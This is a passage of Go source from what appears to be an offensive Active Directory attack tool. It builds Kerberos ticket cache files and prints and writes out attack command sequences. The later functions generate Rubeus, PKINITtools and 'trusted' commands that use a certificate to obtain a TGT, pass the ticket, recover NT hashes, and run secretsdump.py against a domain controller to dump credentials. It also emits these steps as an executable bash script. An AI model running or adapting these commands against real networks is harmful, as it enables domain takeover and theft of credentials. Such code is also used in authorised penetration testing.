	w.writeUint32(uint32(len(sessionKey.KeyValue)))
	w.writeBytes(sessionKey.KeyValue)

	// Times (Unix timestamps, 4 bytes each)
	w.writeUint32(uint32(authTime.Unix()))
	w.writeUint32(uint32(startTime.Unix()))
	w.writeUint32(uint32(endTime.Unix()))
	w.writeUint32(uint32(renewTill.Unix()))

	// is_skey (1 byte)
	w.writeByte(0)

	// ticket_flags (4 bytes, big-endian)
	w.writeUint32(ticketFlags)

	// num_addrs (4 bytes)
	w.writeUint32(0)
	// num_authdata (4 bytes)
	w.writeUint32(0)

	// ticket (4-byte length + raw DER)
	w.writeUint32(uint32(len(ticketDER)))
	w.writeBytes(ticketDER)

	// second_ticket (4-byte length, 0 = none)
	w.writeUint32(0)

	return w.err
}

type ccacheWriter struct {
	w   io.Writer
	err error
}

func (c *ccacheWriter) writeBytes(b []byte) {
	if c.err != nil {
		return
	}
	_, c.err = c.w.Write(b)
}

func (c *ccacheWriter) writeByte(b byte) {
	c.writeBytes([]byte{b})
}

func (c *ccacheWriter) writeUint16(v uint16) {
	b := make([]byte, 2)
	binary.BigEndian.PutUint16(b, v)
	c.writeBytes(b)
}

func (c *ccacheWriter) writeUint32(v uint32) {
	b := make([]byte, 4)
	binary.BigEndian.PutUint32(b, v)
	c.writeBytes(b)
}

func (c *ccacheWriter) writePrincipal(nameType int, realm string, components []string) {
	c.writeUint32(uint32(nameType))
	c.writeUint32(uint32(len(components)))
	c.writeUint32(uint32(len(realm)))
	c.writeBytes([]byte(realm))
	for _, comp := range components {
		c.writeUint32(uint32(len(comp)))
		c.writeBytes([]byte(comp))
	}
}

// ────────────────────────────────────────────────────────────────────────────
// Helpers
// ────────────────────────────────────────────────────────────────────────────

// addASN1AppTag wraps DER-encoded data with an ASN.1 APPLICATION tag.
func addASN1AppTag(data []byte, tag int) []byte {
	tagByte := byte(0x60 | tag) // APPLICATION class (0x40) + constructed (0x20) + tag
	return derTLV(tagByte, data)
}

// concat joins multiple byte slices.
func concat(slices ...[]byte) []byte {
	var total int
	for _, s := range slices {
		total += len(s)
	}
	result := make([]byte, 0, total)
	for _, s := range slices {
		result = append(result, s...)
	}
	return result
}

// ────────────────────────────────────────────────────────────────────────────
// Legacy Guidance Functions (kept for fallback when PKINIT auth isn't needed)
// ────────────────────────────────────────────────────────────────────────────

// PKINITInfo holds the information needed to print PKINIT guidance commands.
// These are external-tool commands (certipy, Rubeus, PKINITtools) as a fallback
// when real PKINIT is not desired or when the user wants to use a different tool.
type PKINITInfo struct {
	CertPath  string
	KeyPath   string
	PFXPath   string
	PFXPass   string
	DC        string
	Domain    string
	TargetUPN string
}

// PrintPKINITGuidance prints external-tool commands for PKINIT authentication.
// Use PKINITAuth() for real built-in PKINIT; this function prints commands for
// Rubeus and PKINITtools as a reference.
func PrintPKINITGuidance(info *PKINITInfo) {
	user := info.TargetUPN
	if idx := strings.Index(user, "@"); idx > 0 {
		user = user[:idx]
	}

	fmt.Println("[*] PKINIT commands (external tools):")

	if info.PFXPath != "" {
	fmt.Println("    # PKINIT auth via trusted (also performs UnPAC-the-hash)")
	fmt.Printf("    KRB5CCNAME=admin.ccache trusted --pkinit -pfx %s --target-dc <DC_IP> --domain %s\n\n", info.PFXPath, info.Domain)

		fmt.Println("    # Rubeus (from Windows)")
		rubeusCmd := fmt.Sprintf("Rubeus.exe asktgt /user:%s /certificate:%s /ptt /getcredentials", user, info.PFXPath)
		if info.PFXPass != "" {
			rubeusCmd += fmt.Sprintf(" /password:%s", info.PFXPass)
		}
		fmt.Printf("    %s\n\n", rubeusCmd)

		fmt.Println("    # PKINITtools gettgtpkinit.py")
		fmt.Printf("    python gettgtpkinit.py %s/%s %s.ccache -cert-pfx %s -pfx-pass '%s'\n\n", info.Domain, user, user, info.PFXPath, info.PFXPass)
	} else if info.CertPath != "" && info.KeyPath != "" {
		pfxPath := strings.TrimSuffix(info.CertPath, filepath.Ext(info.CertPath)) + ".pfx"
		fmt.Println("    # Convert to PFX first:")
		fmt.Printf("    openssl pkcs12 -export -in %s -inkey %s -out %s -passout pass:\n\n", info.CertPath, info.KeyPath, pfxPath)
		fmt.Printf("    KRB5CCNAME=<USER>.ccache trusted --pkinit -pfx %s --target-dc <DC_IP> --domain %s\n\n", pfxPath, info.Domain)
	}

	fmt.Println("    # Pass-the-ticket after TGT:")
	fmt.Printf("    export KRB5CCNAME=%s.ccache\n", user)
	fmt.Printf("    secretsdump.py -k -no-pass -dc-ip <DC_IP> %s/%s@%s\n", info.Domain, user, info.Domain)
}

// PrintPKINITCommands is a compatibility alias for PrintPKINITGuidance.
func PrintPKINITCommands(info *PKINITInfo) {
	PrintPKINITGuidance(info)
}

// GeneratePKINITScript writes a bash script automating the PKINIT authentication flow.
func GeneratePKINITScript(info *PKINITInfo, outputPath string) error {
	user := info.TargetUPN
	if idx := strings.Index(user, "@"); idx > 0 {
		user = user[:idx]
	}

	pfxPath := info.PFXPath
	if pfxPath == "" && info.CertPath != "" {
		pfxPath = strings.TrimSuffix(info.CertPath, filepath.Ext(info.CertPath)) + ".pfx"
	}

	script := fmt.Sprintf(`#!/bin/bash
# Trusted PKINIT Authentication Script
# Target: %s @ %s (DC: %s)
set -e

PFX="%s"
DC="%s"
DOMAIN="%s"
USER="%s"

echo "[*] PKINIT authentication for ${USER}@${DOMAIN}"

# Native trusted binary — no external dependency
if command -v trusted &>/dev/null; then
    echo "[+] Using native trusted binary..."
    export KRB5CCNAME="${USER}.ccache"
    trusted --pkinit -pfx "$PFX" --target-dc "$DC" --domain "$DOMAIN"
    exit 0
fi

# Fallback: PKINITtools
if command -v gettgtpkinit.py &>/dev/null; then
    echo "[+] Using PKINITtools gettgtpkinit.py..."
    python gettgtpkinit.py "${DOMAIN}/${USER}" "${USER}.ccache" -cert-pfx "$PFX" -pfx-pass ''
    export KRB5CCNAME="${USER}.ccache"
    secretsdump.py -k -no-pass -dc-ip "$DC" "${DOMAIN}/${USER}@${DOMAIN}"
    exit 0
fi

echo "[!] No PKINIT tool found. Install gettgtpkinit.py or use the trusted binary."
exit 1
`, info.TargetUPN, info.Domain, info.DC, pfxPath, info.DC, info.Domain, user)

	if err := os.WriteFile(outputPath, []byte(script), 0755); err != nil {
		return fmt.Errorf("write PKINIT script: %w", err)
	}
	fmt.Printf("[+] PKINIT script written to: %s\n", outputPath)
	return nil
}
